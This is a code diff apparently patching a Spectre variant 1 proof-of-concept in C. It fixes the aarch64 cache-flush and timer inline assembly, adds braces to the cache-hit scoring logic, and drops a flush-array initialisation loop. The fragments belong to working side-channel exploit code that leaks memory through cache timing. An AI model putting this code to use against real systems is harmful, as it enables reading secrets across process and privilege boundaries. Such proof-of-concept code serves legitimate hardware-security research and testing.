@@ -179,7 +179,7 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
 #ifndef NOCLFLUSH
       _mm_clflush( & array1_size);
 #elif defined(__aarch64__)
-      __asm volatile("dc civac, %0" : : "r"(&array1): "memory");
+      __asm volatile("dc civac, %0" : : "r"(&array1_size): "memory");
 #elif defined(__x86_64__)
       /* Alternative to using clflush to flush the CPU cache */
       /* Read addresses at 4096-byte intervals out of a large array.
@@ -222,9 +222,9 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
       junk = * addr; /* MEMORY ACCESS TO TIME */
       time2 = __rdtscp( & junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
 #elif defined(__aarch64__)
-      __asm volatile("dsb sy\n isb\n mrs %0, cntvct_el0\n isb\n dsb sy" : "=r" (time1));
+      __asm volatile("dsb sy \n isb \n mrs %0, cntvct_el0 \n isb \n dsb sy" : "=r" (time1) : : "memory");
       junk = * addr; /* MEMORY ACCESS TO TIME */
-      __asm volatile("dsb sy\n isb\n mrs %0, cntvct_el0\n isb\n dsb sy" : "=r" (time2));
+      __asm volatile("dsb sy \n isb \n mrs %0, cntvct_el0 \n isb \n dsb sy" : "=r" (time2) : : "memory");
       time2 -= time1;
 #elif defined(__x86_64__)
 
@@ -263,8 +263,9 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
       time2 = __rdtsc() - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
 #endif
 #endif
-      if ((int)time2 <= cache_hit_threshold && mix_i != array1[tries % array1_size])
+      if ((int)time2 <= cache_hit_threshold && mix_i != array1[tries % array1_size]) {
         results[mix_i]++; /* cache hit - add +1 to score for this value */
+      }
     }
 
     /* Locate highest & second-highest results results tallies in j/k */
@@ -277,8 +278,9 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
         k = i;
       }
     }
-    if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
+    if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0)) {
       break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
+    }
   }
   value[0] = (uint8_t) j;
   score[0] = results[j];
@@ -308,12 +310,6 @@ int main(int argc,
   int score[2];
   uint8_t value[2];
   int i;
-
-  #if defined(NOCLFLUSH) && defined(__x86_64__)
-  for (i = 0; i < (int)sizeof(cache_flush_array); i++) {
-    cache_flush_array[i] = 1;
-  }
-  #endif
   
   for (i = 0; i < (int)sizeof(array2); i++) {
     array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
